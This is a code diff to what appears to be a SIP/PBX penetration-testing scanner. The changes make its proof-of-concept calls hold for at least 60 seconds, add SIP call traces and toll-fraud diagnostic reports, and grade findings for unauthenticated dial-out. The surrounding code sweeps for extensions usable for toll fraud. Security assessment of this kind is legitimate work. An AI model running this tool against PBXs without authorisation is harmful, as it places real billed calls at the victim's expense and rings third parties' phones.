@@ -807,9 +807,13 @@ def main() -> int:
                              f"{', '.join(repr(p) for p, _, _ in all_working_prefixes)})",
                              col)
 
+            # Non-dry-run: enforce minimum 60s hold so the destination phone
+            # rings long enough to be observed — immediate BYE is invisible.
+            _poc_duration = 0.0 if args.call_dry_run else max(60.0, args.call_duration)
+            _mode_label = "DRY-RUN (CANCEL after provisional)" if args.call_dry_run else f"LIVE ({_poc_duration:.0f}s hold)"
             _info(f"Placing PoC call: {col.BOLD}{call_from}{col.RESET} → "
                   f"{col.BOLD}{effective_call_to}{col.RESET}  "
-                  f"dry_run={args.call_dry_run}  srtp={args.srtp}", col)
+                  f"mode={_mode_label}  srtp={args.srtp}", col)
 
             _jitter_sleep(args.jitter)
             result = call.place_call(
@@ -817,7 +821,7 @@ def main() -> int:
                 port=args.port,
                 username=username, password=password,
                 timeout=args.timeout, dry_run=args.call_dry_run,
-                call_duration=0.0 if args.call_dry_run else args.call_duration,
+                call_duration=_poc_duration,
                 traffic_log=traffic_log,
                 pai=args.pai, diversion=args.diversion,
                 privacy=args.privacy, remote_party_id=args.remote_party_id,
@@ -845,13 +849,6 @@ def main() -> int:
             }
 
             if result.success and _anonymous_dialout_probe:
-                _finding("critical",
-                         f"ANONYMOUS DIAL-OUT CONFIRMED — PBX routes PSTN calls from ANY "
-                         f"unauthenticated SIP endpoint with no extension registration required. "
-                         f"Attacker needs only network access to {h.ip}:5060. "
-                         f"Extension {call_from} was never registered or authenticated.",
-                         col)
-
                 # Weak-line sweep: enumerate which extensions the PBX routes
                 # without authentication (every one = a usable toll-fraud launch point).
                 # Run dry_run so the destination only gets a brief ring per candidate.
@@ -896,16 +893,99 @@ def main() -> int:
                              f"{_weak_lines}",
                              col)
 
-            if result.success:
+            # ── SIP message trace ──────────────────────────────────────────
+            if result.sip_trace:
+                _info("", col)
+                _info(f"  {'─'*54}", col)
+                _info("  SIP CALL TRACE", col)
+                _info(f"  {'─'*54}", col)
+                for _tl in result.sip_trace:
+                    _info(f"  {_tl}", col)
+                _info(f"  {'─'*54}", col)
+
+            # ── Comprehensive diagnostic report ────────────────────────────
+            _diag = call.diagnose_call_result(
+                result, host=h.ip, local_ip=result.local_ip_used,
+            )
+            _info("", col)
+            _info(f"{'═'*60}", col)
+            _info("  TOLL-FRAUD CALL DIAGNOSTIC REPORT", col)
+            _info(f"  Target : {h.ip}:{args.port}  Platform: {h.fingerprint or 'unknown'}", col)
+            _info(f"  From   : {call_from}  →  To: {effective_call_to}", col)
+            _info(f"  Mode   : {_mode_label}", col)
+            _info(f"{'─'*60}", col)
+            for _dl in _diag.split("\n"):
+                _info(f"  {_dl}", col)
+            _info(f"{'═'*60}", col)
+            _info("", col)
+
+            # ── NAT warning ────────────────────────────────────────────────
+            if result.nat_suspected:
+                _warn(
+                    f"NAT DETECTED: scanner Contact IP ({result.local_ip_used}) is "
+                    f"private but PBX ({h.ip}) is public. The PBX cannot route BYE/RTP "
+                    f"back to your scanner. Test from same subnet as PBX for definitive "
+                    f"proof, or use a VPN/SSH tunnel into the target network.",
+                    col,
+                )
+
+            # ── Confirmed call announcement ────────────────────────────────
+            if result.success and result.call_confirmed:
+                _ok(
+                    f"{col.BOLD}CALL FULLY CONFIRMED:{col.RESET} 200 OK + BYE acknowledged — "
+                    f"complete RFC 3261 dialog. Hold: {result.hold_seconds_actual:.0f}s.",
+                    col,
+                )
+            elif result.success and not result.call_confirmed:
+                _warn(
+                    f"CALL SIP-CONFIRMED (200 OK) but BYE not acknowledged. "
+                    + ("NAT suspected — PBX cannot reach Contact IP."
+                       if result.nat_suspected else
+                       "Possible NAT or PBX behaviour — see diagnostic above."),
+                    col,
+                )
+
+            # ── Severity findings ──────────────────────────────────────────
+            if result.success and result.call_confirmed and _anonymous_dialout_probe:
+                _finding("critical",
+                         f"ANONYMOUS DIAL-OUT FULLY CONFIRMED (dialog complete) — "
+                         f"unauthenticated call placed to {effective_call_to} "
+                         f"without any credentials. Hold: {result.hold_seconds_actual:.0f}s. "
+                         f"Attacker needs only network access to {h.ip}:{args.port}.",
+                         col)
+            elif result.success and _anonymous_dialout_probe:
+                _finding("critical",
+                         f"ANONYMOUS DIAL-OUT CONFIRMED — PBX routes PSTN calls from ANY "
+                         f"unauthenticated SIP endpoint. Attacker needs only network access "
+                         f"to {h.ip}:{args.port}. Extension {call_from} never registered. "
+                         f"{result.status_code} {result.reason}"
+                         + (" [NAT — BYE unacked]" if result.nat_suspected else ""),
+                         col)
+            elif result.success and result.call_confirmed:
+                _finding("critical",
+                         f"TOLL FRAUD FULLY CONFIRMED — call placed to {effective_call_to} "
+                         f"as {call_from}, BYE acknowledged. "
+                         f"Hold: {result.hold_seconds_actual:.0f}s. "
+                         f"{result.status_code} {result.reason}",
+                         col)
+            elif result.success:
                 _finding("critical",
                          f"TOLL FRAUD CONFIRMED — call placed to {effective_call_to}  "
-                         f"{result.status_code} {result.reason}", col)
+                         f"{result.status_code} {result.reason}"
+                         + (" [NAT — verify from target subnet]" if result.nat_suspected else ""),
+                         col)
+            elif result.status_code == 486:
+                _finding("critical",
+                         f"TOLL FRAUD CONFIRMED — 486 Busy: destination phone rang on PSTN. "
+                         f"Call successfully reached {effective_call_to} via {h.ip}.",
+                         col)
             elif result.reached_dialplan:
                 _finding("high",
                          f"Dialplan engaged — PBX accepted INVITE and started routing  "
-                         f"{result.status_code} {result.reason}", col)
+                         f"{result.status_code} {result.reason}",
+                         col)
             else:
-                _info(f"Call rejected — {result.status_code} {result.reason}", col)
+                _info(f"Call rejected at SIP layer — {result.status_code} {result.reason}", col)
 
             if result.srtp_state == "downgraded":
                 _finding("medium",
